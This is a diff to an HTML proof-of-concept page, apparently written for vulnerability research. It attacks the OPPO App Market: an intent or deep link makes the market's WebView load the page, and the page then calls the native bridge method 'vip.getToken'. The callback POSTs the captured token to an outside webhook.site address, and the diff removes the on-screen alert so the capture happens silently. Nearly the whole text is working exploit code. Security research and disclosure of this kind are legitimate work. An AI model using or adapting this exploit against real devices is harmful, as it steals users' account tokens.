@@ -5,33 +5,35 @@
 </head>
 <body>
     <h1>Security Proof of Concept</h1>
-    <p>Click the button below to trigger the internal App Market check.</p>
+    <p>Click the button below. If the "Open in Market?" prompt appears, click <b>Open</b>.</p>
     
-    <button onclick="triggerDeepLink()" style="padding: 20px; font-size: 20px;">
-        Run Exploit Test
+    <button onclick="triggerIntent()" style="padding: 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; font-size: 18px;">
+        Run Exploit Test (Intent Mode)
     </button>
 
     <script>
-        function triggerDeepLink() {
-            // This is the actual deep link that triggers the OPPO App Market
-            window.location.href = "oppomarket://credits?url=https://pk009900.github.io/my-oppo-test/";
+        function triggerIntent() {
+            // The Intent URL format is required for Chrome on Android to trigger deep links reliably
+            const targetUrl = "https://pk009900.github.io/my-oppo-test/";
+            const intentLink = `intent://credits?url=${targetUrl}#Intent;scheme=oppomarket;package=com.heytap.market;S.browser_fallback_url=${targetUrl};end`;
+            
+            window.location.href = intentLink;
         }
 
-        // Logic to capture token once the page is LOADED INSIDE the App Market
+        // --- Logic for when the page is successfully loaded INSIDE the App Market ---
         const exfilUrl = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
 
         function leak_callback(data) {
             fetch(exfilUrl, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({ payload: data })
+                body: JSON.stringify({ payload: data, status: "SUCCESS" })
             });
-            alert("Token Captured! Check Webhook.site");
         }
 
         window.onload = function() {
-            // If we are already inside the App Market WebView, the bridge will exist
             if (window.HeytapNativeApi) {
+                // If the bridge is found, exfiltrate the token immediately
                 window.HeytapNativeApi.invoke("vip.getToken", "leak_callback");
             }
         };
